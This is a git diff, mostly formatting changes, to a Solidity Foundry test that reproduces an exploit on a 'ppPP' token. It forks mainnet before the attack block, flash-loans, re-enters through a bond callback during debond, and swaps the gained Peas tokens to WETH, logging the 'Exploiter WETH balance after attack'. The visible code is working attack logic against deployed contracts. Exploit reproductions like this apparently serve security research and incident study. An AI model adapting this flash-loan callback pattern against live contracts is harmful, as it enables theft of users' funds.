@@ -23,6 +23,7 @@ interface IUniswapV3Router {
         ExactInputParams memory params
     ) external payable returns (uint256 amountOut);
 }
+
 interface IppPP is IERC20 {
     function flash(address _recipient, address _token, uint256 _amount, bytes memory _data) external;
 
@@ -38,7 +39,7 @@ contract ContractTest is Test {
     IUniswapV3Router private constant Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 19109653 - 1);
+        vm.createSelectFork("mainnet", 19_109_653 - 1);
         vm.label(address(DAI), "DAI");
         vm.label(address(ppPP), "ppPP");
         vm.label(address(WETH), "WETH");
@@ -62,31 +63,28 @@ contract ContractTest is Test {
         percentage[0] = 100;
         ppPP.debond(ppPP.balanceOf(address(this)), token, percentage);
         PeasToWETH();
-        emit log_named_decimal_uint("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals());
+        emit log_named_decimal_uint(
+            "Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
+        );
     }
 
-    function callback(bytes calldata data) external {
+    function callback(
+        bytes calldata data
+    ) external {
         Peas.approve(address(ppPP), Peas.balanceOf(address(this)));
         ppPP.bond(address(Peas), Peas.balanceOf(address(this)));
     }
 
     function PeasToWETH() internal {
         Peas.approve(address(Router), type(uint256).max);
-        bytes memory _path = abi.encodePacked(
-            address(Peas),
-            hex"002710",
-            address(DAI),
-            hex"0001f4",
-            address(WETH)
-        );
-        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router
-            .ExactInputParams({
-                path: _path,
-                recipient: address(this),
-                deadline: block.timestamp + 1000,
-                amountIn: Peas.balanceOf(address(this)),
-                amountOutMinimum: 0
-            });
+        bytes memory _path = abi.encodePacked(address(Peas), hex"002710", address(DAI), hex"0001f4", address(WETH));
+        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
+            path: _path,
+            recipient: address(this),
+            deadline: block.timestamp + 1000,
+            amountIn: Peas.balanceOf(address(this)),
+            amountOutMinimum: 0
+        });
         Router.exactInput(params);
     }
 }
